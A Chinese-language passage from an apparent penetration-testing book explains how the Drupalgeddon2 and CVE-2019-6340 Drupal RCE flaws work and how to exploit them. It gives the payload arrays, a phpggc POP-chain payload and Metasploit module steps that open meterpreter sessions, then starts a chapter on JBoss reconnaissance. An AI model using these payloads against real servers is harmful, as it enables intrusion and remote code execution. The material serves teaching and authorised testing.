droopescan 是一个基于插件的扫描器，用于识别多个 CMS 中的漏洞，但主要是 Drupal。droopescan 使用预先构建的单词列表，并通过暴力破解来检测模块、主题和插件。因此，这完全取决于我们的单词列表有多好。我们也可以找到其他基于 Drupal 的漏洞扫描器，用于识别 Drupal 中的漏洞。唯一的区别是它们所使用的语言（为了效率）和单词列表。

当我们在 Drupal CMS 中发现漏洞后，我们可以继续寻找它们的公开利用程序。其中最著名的漏洞之一是 Drupalgeddon。在接下来的部分中，我们将介绍 Drupalgeddon2 漏洞，并学习如何利用它。

# 利用 Drupal

在利用 Drupal 时，以下是我们需要牢记的攻击向量：

+   为了进行暴力破解攻击，枚举 Drupal 用户。

+   通过猜测密码利用 Drupal 的破损认证

+   利用插件、主题或模块进行任意文件泄露和上传、持久性**跨站脚本**（**XSS**）等

+   利用 Drupal 核心组件进行 SQL 注入和**远程代码执行**（**RCE**）

对于不同版本的 Drupal，可以使用不同的公开利用程序。有时，我们可以使用公开利用程序访问 Drupal 站点，而其他时候我们必须更改利用程序使其生效。了解利用程序并在后期执行它总是一个好的实践。现在让我们先专注于 Drupalgeddon2 的公开利用程序。

# 利用 Drupal 使用 Drupalgeddon2

2018 年 3 月 28 日，Drupal 发布了一份公告，强调了 Drupal 各个版本中的 RCE 漏洞。后来这个漏洞被重新命名为 Drupalgeddon2。Drupal 6 版本引入了 Form API，用于在表单渲染期间修改数据，在 Drupal 7 中，这被泛化为**可渲染数组**。可渲染数组以键值结构包含元数据，并在渲染过程中使用：

```
[ 
'#type' => 'email', 
'#title => '<em> Email Address</em>', 
'#prefix' => '<div>', 
'#suffix' => '</div>' 
] 
```

现在让我们了解一下基于表单的漏洞。

# 了解 Drupalgeddon 漏洞

Drupalgeddon 漏洞与特定注册表单有关。此表单在所有 Drupal 安装中都可用，并且可以在没有任何身份验证的情况下访问。在此表单中，电子邮件字段允许用户输入未经过处理的输入，这允许攻击者将数组注入到表单数组结构中（作为`email`字段的值）。以下属性可用于利用此漏洞：

+   `#post_render`

+   `#lazy_builder`

+   `#pre_render`

+   `#access_callback`

Metasploit 的利用模块使用`#post_render`属性将有效载荷注入到`mail`数组中，大致如下所示：

```
[ mail[#post_render][]': 'exec', // Function to be used for RCE mail[#type]': 'markup', 'mail[#markup]': 'whoami' // Command ] 
```

在渲染时，将调用`exec()`函数，该函数将执行`whoami`命令并返回输出。现在让我们继续看看这个利用程序的实际操作。

以下代码可以在`/core/lib/Drupal/Core/Render/Renderer.php`中找到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/be660a7c-1d53-487f-853c-d05648a9997d.png)

`/core/modules/file/src/Element/ManagedFile.php`如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a5a0017f-828c-48f1-ac59-72b9ddabcd1b.png)

我们可以看到表单值使用斜杠进行分解，然后使用`NestedArray::getValue()`函数来获取值。根据返回的数据，渲染结果。在这种情况下，`$form["user_picture"]["widget"][0]`变成了`user_picture/widget/0`。我们可以输入我们自己的路径到所需的元素。在帐户注册表单中，有`mail`和`name`参数。`name`参数过滤用户数据，但`email`参数不会。我们可以将此参数转换为数组，并提交以`#`开头的行作为键。

返回到`/core/lib/Drupal/Core/Render/Renderer.php`，我们看到`#post_render`属性将`#children`元素并将其传递给`call_user_func()`函数，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6ce011fc-841b-4398-995c-ef246f48e348.png)

这是来自 PHP 手册的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/677cb687-a188-4d27-83ef-8ce9b2514175.png)

如果我们传递`call_user_func(system,id)`，它将被执行为`system(id)`。因此，我们需要将`#post_render`定义为`exec()`，并将`#children`定义为我们要传递给`exec()`的值：

```
[ 
mail[#post_render][]': printf, 
mail[#type]': 'markup', 
'mail[#children]': testing123 
] 
```

另一种方法是使用`#markup`元素，该元素由互联网上提供的其他漏洞利用所使用。

# 使用 Metasploit 利用 Drupalgeddon2

还有一个 Metasploit 模块可用于利用 Drupalgeddon2 漏洞，我们可以通过在 msfconsole 中执行以下命令来使用它：

```
use exploit/unix/webapp/drupal_drupalgeddon2
```

现在，执行以下步骤来利用漏洞：

1.  要查看选项，我们运行`show options`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/dd93cd7f-20c2-4ae7-8caa-036106f54951.png)

1.  接下来，设置`rhosts`和`rport`的选项，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4a43b16c-906d-41e6-be30-5d7a22b4bf6d.png)

1.  当利用程序运行时，首先通过向`/`发出请求来查找响应标头或元标记中的 Drupal 版本来进行指纹识别，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1140cab0-4235-4607-bb13-fdc91999c4ed.png)

1.  接下来，通过调用`CHANGELOG.txt`并查找`SA-CORE-2018-002`补丁来执行补丁级别检查，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e744cbc6-c914-498d-ae85-65c49566d635.png)

完成前两个步骤后，利用程序通过简单调用`printf`函数来确认 RCE 的存在并打印响应中的值：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/973be9fe-dbff-4f6c-a5c4-efc109b40f0f.png)

在上述截图中，我们使用了`testing123`字符串。如果服务器响应`testing123`，则服务器存在 Drupalgeddon2 漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/06e70d9a-93fd-4c93-8e8b-4655ae043bdc.png)

使用 PHP 的`passthru()`函数来确认 RCE 以执行`id`、`whoami`和`uname -a`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5090a9af-6328-4612-9102-01a5a2b2fc59.png)

服务器将响应返回给执行的命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1c624e12-a14a-42fd-90d2-ae84db657c13.png)

1.  最后一步是发送 PHP meterpreter 有效载荷，如下所示，将其注入并在内存中执行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/53499d94-19c2-4618-b0dc-9d398321ebd9.png)

成功执行后，我们将在终端中打开一个 meterpreter 会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7ad41191-f982-420a-8449-4710ee434b3a.png)

现在，让我们看另一个 Drupal 漏洞的例子，并尝试理解它是如何工作的。

# RESTful Web Services 漏洞 - unserialize()

2019 年 2 月，CVE-2019-6340 发布，披露了 Drupal 的 RESTful web 服务模块中的一个漏洞。这个漏洞可以被利用来执行 RCE。只有当 Drupal 安装了所有的 web 服务（**HAL**，**Serialization**，**RESTful Web Services**和**HTTP Basic Authentication**，如下面的截图所示）时，才可能发生 RCE：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/28e062fc-3526-4c96-ac10-737f7e4bee1c.png)

RESTful Web Services 模块使用 REST API 与 Drupal 通信，可以对网站资源执行更新、读取和写入等操作。它依赖于序列化模块对发送到 API 和从 API 接收的数据进行序列化。Drupal 8 核心使用**Hypertext Application Language**（**HAL**）模块，在启用时使用 HAL 对实体进行序列化。我们可以通过使用`GET`方法请求节点并带上`_format=hal_json`参数来检查 Drupal 服务器是否启用了这些 web 服务，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e721e86a-a4ee-4f2f-85b4-df93db8c2299.png)

如果安装了模块，我们将得到一个基于 JSON 的响应，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1d2ac192-34b1-4eca-bdfb-97413a18184c.png)

如果服务器没有 web 服务模块，我们将收到`406`（`不可接受`）的 HTTP 代码错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1a9fa8b6-f200-4f68-8191-8c3265b97bdb.png)

这个漏洞存在是因为`LinkItem`类接受未经过处理的用户输入，并将其传递给`unserialize()`函数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b8d2ce64-296d-4e26-a1f5-3a7b359837e5.png)

从下面的截图中可以看到，根据`unserialize()`函数的 PHP 手册，当使用`unserialize()`时，我们不应该让不受信任的用户输入传递给这个函数：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e9d74ccb-6fff-40b8-907d-f2654f0b8e97.png)

为了利用这个漏洞，需要满足**三个**条件：

+   应用程序应该有一个我们可以控制的`unserialize()`函数。

+   应用程序必须有一个实现 PHP 魔术方法（`destruct()`或`wakeup()`）的类，执行危险语句。

+   需要有一个序列化的有效负载，使用应用程序中加载的类。

从前面的截图中，我们可以确认我们可以控制`$value['options']`表单实体。为了检查魔术方法，让我们使用以下命令在源代码中搜索`destruct()`函数：

```
ag __destruct | grep guzzlehttp
```

下面的截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/08e86e24-974d-4070-98be-bfe6d28f49aa.png) **注意**：在执行上述命令之前，您必须安装`ag`包。

在上面的截图中，我们排除了`guzzlehttp`，因为 Guzzle 被 Drupal 8 用作 PHP HTTP 客户端和用于构建 RESTful web 服务客户端的框架。

从查看`FnStream.php`文件（参考上面的截图）中，我们可以看到`__destruct()`魔术方法调用了`call_user_func()`函数，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5387edda-be4c-4204-98f4-5b18a8a9e62a.png)

`call_user_func()`是一个非常危险的函数，特别是当传递多个参数时。我们可以使用这个函数来执行函数注入攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d881b08a-7212-47d7-b563-931509ee6ddb.png)

根据 OWASP 的说法，函数注入攻击包括将客户端的函数名称插入或**注入**到应用程序中。成功的函数注入利用可以执行任何内置或用户定义的函数。函数注入攻击是一种注入攻击类型，其中任意函数名称，有时带有参数，被注入到应用程序中并执行。如果参数被传递到注入的函数，这将导致 RCE。

根据 Drupal API 文档，`LinkItem` 类用于实现 `link` 字段类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/13a4dcde-1e0f-4148-a7ad-be1fc1c8d976.png)

我们知道 `LinkItem` 类将未经过处理的用户输入传递给 `unserialize()` 函数，但要调用此类，我们需要首先调用一个实体。实体将是特定实体类型的一个实例，例如评论、分类术语或用户配置文件，或者是一组实例，例如博客文章、文章或产品。我们需要找到一个被 `LinkItem` 用于导航的实体。让我们使用以下命令在源代码中搜索实体：

```
ag LinkItem | grep Entity
```

以下屏幕截图显示了前述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7bccca3c-e951-4a7d-bb8f-50780360ece6.png)

从前面的屏幕截图中可以看到，`LinkItem` 用于导航到 `MenuLinkContent.php` 和 `Shortcut.php` 实体，并且从 `Shortcut.php` 文件中可以看到，快捷方式实体正在创建一个 `link` 属性：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/90eb533f-940f-4f5d-8317-2f814f4095d0.png)

要触发 `unserialize()` 函数，我们需要将我们迄今为止解释的所有元素对齐在一起：

```
{ "link": [ { "value": "link", "options": "<SERIALIZED_PAYLOAD>" } ], "_links": { "type": { "href": "localhost/rest/type/shortcut/default" } } } 
```

现在我们已经满足了三个条件中的两个，唯一剩下的就是创建我们的序列化有效负载。有各种方法可以创建序列化有效负载，但我们将使用一个名为**PHP 通用小工具链**（**PHPGGC**）的库来为 Guzzle 创建一个序列化有效负载。要使用 `phpggc` 生成序列化有效负载，我们使用以下命令：

```
./phpggc <gadget chain> <function> <command> --json
```

以下屏幕截图显示了前述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/f1b16264-0f54-4cdb-8b9c-e8acf296f33b.png)

在前述屏幕截图中生成的 JSON 序列化有效负载将调用 `system()` 函数并运行 `id` 命令。我们将以以下 URL 格式使用 `GET/POST/PUT` 方法提交整个有效负载：`localhost/node/1?_format=hal_json`

服务器将执行 `id` 命令并返回我们在此处显示的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e99611e3-3515-4e8a-87c2-7e3d72f64152.png)

我们已成功实现了 RCE，但问题仍然存在：为什么序列化有效负载有效？要回答这个问题，我们需要了解一般序列化数据的外观，并了解序列化格式。

# 理解序列化

为了基本了解 `serialize()` 函数，让我们看一下以下 PHP 代码片段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6bc0db63-b4d7-453f-b13a-f8437195ddf1.png)

在前面的代码中，我们初始化了一个名为 `my_array` 的数组，其中包含以下元素：

+   `my_array[0] = "Harpreet"`

+   `my_array[1] = "Himanshu"`

然后我们使用 `serialize()` 函数为数组生成序列化数据。如下屏幕截图所示，序列化数据流如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6f514979-d1e7-4650-a6e2-feae11be981f.png)

其他常用的 PHP 序列化格式包括：

+   `a`：数组

+   `b`：布尔值

+   `i`：整数

+   `d`：双精度

+   `O`: 通用对象

+   `r`：对象引用

+   `s`：字符串

+   `C`：自定义对象

Metasploit 还针对此漏洞内置了一个利用程序。查看利用程序的源代码，我们注意到它使用的有效负载几乎与 PHPGCC 生成的有效负载相同：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5dfc91eb-4d83-46d3-b7fb-145af8c686a3.png)

唯一的区别是命令及其长度根据我们通过利用选项给出的输入动态设置。

正如我们在下面的截图中所看到的（在这里我们调用`__destruct()`函数），要在`call_user_func()`中执行函数注入，我们必须控制`_fn_close`方法，以便危险函数（如`system()`、`passthru()`和`eval()`）可以轻松地作为第一个参数传递给`call_user_func()`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ea3ce84e-d2e6-4f59-831b-6b207d8dc051.png)

要控制`_fn_close`方法，我们必须查看构造函数（`__construct()`）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/dccd4d87-9547-458a-8991-9e695d07cffa.png)

从上面的截图中可以看出，`$methods`数组作为参数传递给构造函数。`__construct()`函数将通过循环遍历`$methods`数组来创建函数，然后在`_fn_`字符串之前添加。如果`$methods`数组中有一个`close`字符串，该字符串将被添加上`_fn_`，从而形成`_fn_close`方法。现在，让我们看看`$methods`数组中的元素：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c0298697-61c6-426b-b948-32420e3352f7.png)

从上面的截图中可以清楚地看到`$methods`数组中有一个值为`close`的元素。现在我们知道如何控制`_fn_close`方法，接下来，我们必须找到一种方法将危险函数和要执行的命令传递给`_fn_close`。为此，我们必须创建一个**POP 链**。

# 什么是 POP 链？

在内存损坏漏洞（如缓冲区溢出和格式字符串）中，如果存在内存防御措施，如**数据执行防护**（**DEP**）和**地址空间布局随机化**（**ASLR**），则可以使用代码重用技术，如**返回到 libc**（**ret2libc**）和**返回导向编程**（**ROP**）来绕过这些防御措施。代码重用技术在基于 PHP 的 Web 应用程序的情况下也是可行的，这些应用程序使用对象的概念。可以利用对象属性进行利用的一种代码重用技术是**基于属性的编程（POP）**。

POP 链是一种利用 Web 应用程序中对象注入漏洞的利用方法，利用能够任意修改被注入到给定 Web 应用程序中的对象的属性的能力。然后可以相应地操纵受害应用程序的数据和控制流。

创建一个 POP 链，序列化的负载使用`GuzzleHttp`的`HandlerStack`类：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b863d5af-a05a-4373-9aee-26ab0e7d1bfc.png)

我们将我们的命令传递给`handler`方法，将危险函数传递给`stack[]`方法，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d2cd4c36-ebe9-4e5b-a78d-75dfe3b18823.png)

一旦析构函数被调用（在对象销毁时会自动调用），`_fn_close`方法的属性将被传递给`call_user_func()`，并执行`system(id)`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/130a43e7-9a43-42bf-8dcd-d80855746173.png)

接下来，我们将反序列化负载。

# 反序列化负载

为了更清楚地理解负载，我们可以对其进行反序列化并使用`var_dump`。根据 PHP 手册，`var_dump`显示关于一个或多个表达式的结构化信息（包括类型和值）。`var_dump`会递归地探索数组和对象，并缩进显示结构。我们也可以使用`print_r()`函数执行相同的操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1e4e11bb-a571-4201-ad87-ca29d6df17ec.png)

由于我们使用基于`GuzzleHttp`客户端的负载，我们需要安装 Guzzle。我们可以使用以下 PHP 代码对其进行反序列化：

```
<?php
require __DIR__ . '/vendor/autoload.php';
$obj= unserialize(json_decode(file_get_contents("./payload.txt")));
var_dump($obj);
?>
```

运行代码将给我们以下输出：

```
object(GuzzleHttp\Psr7\FnStream)#3 (2) {["methods":"GuzzleHttp\Psr7\FnStream":private]=>array(1) {["close"]=>array(2) {[0]=>object(GuzzleHttp\HandlerStack)#2 (3) {["handler":"GuzzleHttp\HandlerStack" :private]=>string(1) "id"["stack":"GuzzleHttp\HandlerStack":private]=>array(1) {[0]=>array(1) {[0]=>string(4) "system"}}["cached":"GuzzleHttp\HandlerStack" :private]=>bool(false)}[1]=>string(7) "resolve"}}["_fn_close"]=>array(2) {[0]=>object(GuzzleHttp\HandlerStack)#2 (3) {["handler":"GuzzleHttp\HandlerStack" :private]=>string(1) "id"["stack":"GuzzleHttp\HandlerStack":private]=>array(1) {[0]=>array(1) {[0]=>string(4) "system"}}["cached":"GuzzleHttp\HandlerStack" :private]=>bool(false)}[1]=>string(7) "resolve"}
```

当执行时，会导致`system()`函数执行传递给该函数的命令，并将输出返回给我们。

# 通过 Metasploit 使用 unserialize()利用 RESTful Web Services RCE

现在我们了解了序列化的概念以及如何对有效载荷进行序列化，让我们使用 Metasploit 的`exploit`模块来利用这个漏洞。执行以下命令来使用`exploit`模块：

```
use exploit/unix/webapp/drupal_restws_unserialize
```

以下截图显示了前述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/53af4093-02c2-4f7e-a999-34476b2a707d.png)

然后我们设置选项并运行利用。运行 Metasploit 模块后，我们会观察到它首先通过询问`CHANGELOG.txt`来查找**SA-CORE-2019-003**补丁来执行补丁级别检查。执行`id`命令以确认 Drupal 安装上的 RCE，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a8a4bfbc-a4ce-4363-8680-084c41f9b7b3.png)

成功利用后，服务器将返回`id`命令的输出，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1623bd94-efad-4951-90f7-103f4d0f8ddd.png)

然后，PHP meterpreter 代码被序列化并发送到服务器，一个 meterpreter 会话在我们的 Metasploit 中打开，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2339fefb-69b9-4c2e-9ab8-47141bf4dcce.png)

我们通过利用 RESTful Web Services 模块获得了对 Drupal 服务器的访问。

# 摘要

我们从讨论 Drupal 的架构和目录结构开始了本章。然后，我们学习了如何手动和自动执行 Drupal 的侦察。之后，我们看了两个利用的例子，并逐步介绍了整个利用过程。

在下一章中，我们将看一下对 JBoss 服务器的枚举和利用。

# 问题

1.  相同的漏洞可以用来利用不同版本的 Drupal 吗？

1.  我们需要在本地安装 Drupal 来利用远程 Drupal 网站吗？

1.  RESTful API Web Services 利用不起作用-我们能做些什么？

1.  我们可以访问 Drupal 管理员帐户-我们如何在服务器上实现 RCE？

1.  我们在 Drupal 网站上发现了一个`.swp`文件-这可以用于利用吗？

# 进一步阅读

+   Drupal 8 的架构：[`www.drupal.org/docs/8/modules/entity-browser/architecture`](https://www.drupal.org/docs/8/modules/entity-browser/architecture)

+   Drupal 8 RCE 的深入研究：[`www.ambionics.io/blog/drupal8-rce`](https://www.ambionics.io/blog/drupal8-rce)


# 第十四章：在技术平台上进行渗透测试

在这一部分，我们将看一下最常用的技术平台，比如 JBoss、Tomcat 和 Jenkins。我们还将研究它们的枚举和深入利用。我们将涵盖最新的针对上述技术出现的**常见漏洞和曝光**（**CVEs**），并尝试理解根本原因。

本节包括以下章节：

+   第十一章，*技术平台渗透测试 - JBoss*

+   第十二章，*技术平台渗透测试 - Apache Tomcat*

+   第十三章，*技术平台渗透测试 - Jenkins*


# 第十五章：技术平台的渗透测试 - JBoss

本书的前几章介绍了如何对**内容管理系统**（**CMS**）进行渗透测试。现在我们已经清楚了不同 CMS 架构和进行测试的不同方法，让我们继续学习如何对不同技术进行测试。在本章中，我们将学习 JBoss 及其架构和利用。JBoss 是一个组织专注于自动化部署基于 Java 的应用程序的最易部署的应用之一。由于其灵活的架构，许多组织选择了 JBoss，但正是因为其对组织的极大易用性，JBoss 也成为了威胁行为者广泛瞄准的目标。本章将涵盖以下主题：

+   JBoss 简介

+   使用 Metasploit 对基于 JBoss 的应用服务器进行侦察

+   对 JBoss 的漏洞评估

+   利用 Metasploit 模块进行 JBoss 利用

# 技术要求

本章的先决条件如下：

+   JBoss **应用服务器** (**AS**)实例（[`jbossas.jboss.org/`](https://jbossas.jboss.org/)）

+   Metasploit 框架（[`www.metasploit.com/`](https://www.metasploit.com/)）

+   JexBoss 是一个第三方工具（[`github.com/joaomatosf/jexboss`](https://github.com/joaomatosf/jexboss)）

# JBoss 简介

JBoss AS 是一个基于**Java 企业版**（**Java EE**）的开源应用服务器。该项目始于 1999 年的 Mark Fluery。自那时起，JBoss Group（LLC）于 2001 年成立，并且在 2004 年，JBoss 成为了以 JBoss, Inc.的名义成立的公司。在 2006 年初，甲骨文试图收购 JBoss, Inc.，但在同一年晚些时候，RedHat 成功收购了该公司。

由于 JBoss AS 基于 Java，该应用服务器支持跨平台安装，并且与市场上的其他专有软件不同，JBoss 以非常低的价格提供相同的功能。以下是 JBoss 的一些优点：

+   由于基于插件的架构而具有灵活性

+   安装和设置简单

+   提供完整的 Java EE 堆栈，包括**企业 JavaBean**（**EJB**）、**Java 消息服务**（**JMS**）、**Java 管理扩展**（**JMX**）和**Java 命名和目录接口**（**JNDI**）

+   可以运行**企业应用**（**EA**）

+   成本效益

由于灵活的插件架构，开发人员不必花时间为其应用程序开发服务。这里的目标是节省金钱和资源，以便开发人员可以更多地专注于他们正在开发的产品。

# JBoss 架构（JBoss 5）

JBoss 架构在过去几年逐渐发生了变化，并且随着每个主要版本的发布，新的服务已被添加。在本章中，我们将查看 JBoss AS 5 的架构概述，并在本章后面的*JBoss 利用*部分中涵盖架构的利用部分。要了解 JBoss AS 架构，请参考以下图表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ead9fe86-c45c-4e7d-834c-a77cc9c0dc0a.png)

我们可以将架构分为四个主要组件，如下所示：

+   **用户应用程序**：顾名思义，该组件处理用户应用程序，并包含 XML 配置文件、**Web 应用程序资源**（**WAR**）文件等。这是用户应用程序部署的地方。

+   **组件部署器**：JBoss 中使用部署器来部署组件。`MainDeployer`，`JARDeployer`和`SARDeployer`是 JBoss 服务器核心中的硬编码部署器。所有其他部署器都是**托管 Bean**（**MBean**）服务，它们将自己注册为`MainDeployer`的部署器。

+   **企业服务**：该组件负责处理多种事务，如事务、安全和 Web 服务器。

+   **JBoss 微容器**：这可以作为独立容器在 JBoss AS 之外使用。它旨在提供一个环境来配置和管理**Plain Old Java Objects**（**POJOs**）。

现在，让我们来看一下目录结构。

# JBoss 文件和目录结构

JBoss 有一个简化的目录结构。通过浏览到 JBoss 的`home`目录并列出内容，我们可以看到下面截图中显示的结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/373822c3-8295-4c5f-8db6-5cb1300c5c13.png)

让我们试着了解一下这些目录是什么，它们包含了什么文件和文件夹：

+   `bin`：这个目录包含所有入口点的**Java Archives**（**JARs**）和脚本，包括启动和关闭。

+   `client`：这个目录存储可能被外部 Java 客户端应用程序使用的配置文件。

+   `common`：这个目录包含服务器的所有公共 JAR 和配置文件。

+   `docs`：这个目录包含 JBoss 文档和模式，在开发过程中很有帮助。

+   `lib`：这个目录包含 JBoss 启动所需的所有 JAR 文件。

+   `server`：这个目录包含与不同服务器配置文件相关的文件，包括生产和测试。

通过进一步进入`server`目录并列出内容，我们可以看到下面截图中显示的结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/09273d72-b27a-4366-8940-34ffe73f3fbc.png)

让我们打开其中一个配置文件，了解一下结构。下面的截图显示了`default`文件夹的列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/84e26978-9be2-4e9f-ab3c-03562e8bab9c.png)

让我们来看一下前面截图中目录的详细情况：

+   `conf`：这个目录包含配置文件，包括`login-config`和`bootstrap config`。

+   `data`：这个目录可用于在文件系统中存储内容的服务。

+   `deploy`：这个目录包含在服务器上部署的 WAR 文件。

+   `lib`：`lib`目录是静态 Java 库的默认位置，在启动时加载到共享类路径中。

+   `log`：这个目录是所有日志写入的地方。

+   `tmp`：这个目录被 JBoss 用来存储临时文件。

+   `work`：这个目录包含编译后的 JSP 和类文件。

通过进一步进入`deploy`目录并列出内容，我们可以看到各种 WAR 文件、XML 文件等，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d67933e1-5126-4dd9-82a2-43c0c1952595.png)

我们需要了解的一些文件包括：

+   `admin-console.war`是 JBoss AS 的管理控制台。

+   `ROOT.war`是`/root` web 应用程序。

+   `jbossweb.sar`是部署在服务器上的 Tomcat servlet 引擎。

+   `jbossws.sar`是支持 Web 服务的 JBoss 服务。

大多数情况下，我们会发现服务器上缺少`admin-console`，因为 JBoss 管理员会将`admin-console`、`web-console`和`JMX-console`应用程序从服务器中移除。尽管这是保护 JBoss 实例的一种很好的方式，但这对威胁行为者并不起作用。JBoss AS 也可以使用 MBeans 进行管理。尽管它们是管理员的功能，但 MBeans 也可以作为允许行为者渗透网络的活门。要访问 MBeans，让我们首先了解文件和目录结构，因为这将帮助我们学习如何在过程中访问 MBeans。在 JBoss AS 中部署的大量 MBeans 可以直接通过`JMX-console`和`web-console`访问，这引发了许多关于部署安全性的担忧。

在深入研究 JBoss 利用之前，让我们先了解如何在 JBoss AS 部署上执行侦察和枚举。

# 侦察和枚举

在这一部分，我们将专注于对 JBoss 服务器的侦察和枚举。有各种方法可以识别 JBoss 服务器，比如默认情况下 JBoss 监听 HTTP 端口`8080`。让我们看一些用于 JBoss 侦察的常见技术。

# 通过主页检测

我们可以使用的一种非常基本的技术是访问 Web 服务器主页，该主页显示了 JBoss 的标志，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/383af0ec-3d7d-4c0b-a786-5b436de15814.png)

当我们打开 JBoss 主页时，默认的 JBoss 设置会显示其他超链接，我们可以浏览以获取更多信息。

# 通过错误页面进行检测

有时候我们会发现 JBoss AS 运行在`8080`端口，但主页无法访问。在这种情况下，`404`错误页面也可以透露出 JBoss AS 的标头和版本号，用于正在使用的 JBoss 应用实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a3d569f5-541d-45bd-a026-9abdefd0186f.png)

通过打开任意不存在的链接可以生成一个`404`错误页面，这将给我们一个错误，如前面的截图所示。

# 通过标题 HTML 标签进行检测

有些情况下，当我们尝试访问 JBoss AS 时，我们会得到一个空白页面。这通常是为了保护主页免受公开暴露和未经身份验证的访问。由于主页包含了相当有价值的信息，JBoss 管理员倾向于通过反向代理身份验证或删除应用程序中的 JMX 控制台、Web 控制台和管理控制台来保护页面（如本章前面提到的）。这些控制台将在本章的扫描和利用阶段进一步讨论：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7a5e1c1a-5c53-45a4-a568-17b3c08188e0.png)

如果我们得到一个空白页面，我们仍然可以通过 HTML `<title>`标签来识别 JBoss，该标签在页面标题中透露了一些信息，如前面的截图所示。

# 通过 X-Powered-By 进行检测

JBoss 还在 HTTP 响应标头中透露了其版本号和构建信息，如下截图所示。我们可以在`X-Powered-By`HTTP 响应标头中找到版本和构建信息。即使管理控制台或 Web 控制台不可访问，部署在 JBoss 中的应用程序也没有配置隐藏标头：

